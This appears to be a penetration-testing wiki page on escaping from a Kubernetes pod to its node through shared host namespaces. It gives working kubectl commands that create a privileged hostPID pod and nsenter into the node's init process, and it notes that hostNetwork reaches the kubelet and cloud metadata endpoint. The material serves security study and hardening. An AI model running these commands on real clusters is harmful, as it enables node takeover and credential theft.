---
title: "Host namespaces: escaping to the node through shared pod namespaces"
description: "Escaping to a Kubernetes node from a pod that shares the node's namespaces through hostPID, hostNetwork, or hostIPC, using the shared process view to nsenter into node processes or reaching node-local services and the metadata endpoint."
keywords:
  - hostPID
  - hostNetwork
  - hostIPC
  - nsenter
  - kubernetes node escape
---

# Host namespaces

A pod can request the node's namespaces with `hostPID`, `hostNetwork`, or `hostIPC`. `hostPID` exposes every node process for nsenter or injection; `hostNetwork` puts the pod on the node's interfaces, reaching the kubelet and metadata service; `hostIPC` exposes node shared memory.

```bash
# A pod with hostPID can enter node process namespaces
kubectl run pwn --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"c","image":"alpine","securityContext":{"privileged":true},"command":["sleep","1d"]}]}}'
kubectl exec -it pwn -- nsenter --target 1 --mount --pid -- sh
```

## Exploitation notes

- The breakout is the generic [Shared host namespaces](../../../container-escape/shared-host-namespaces/index.md); the pod spec requests the sharing.
- `hostNetwork` alone reaches the kubelet and the cloud metadata endpoint even when the pod network blocks them, see [Cloud metadata from pod](../cluster-enumeration/cloud-metadata-from-pod.md).
- `hostPID` with nsenter needs the privileged or `CAP_SYS_ADMIN` context to enter the mount namespace.

## References

- [Kubernetes: security context](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Kubernetes: Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
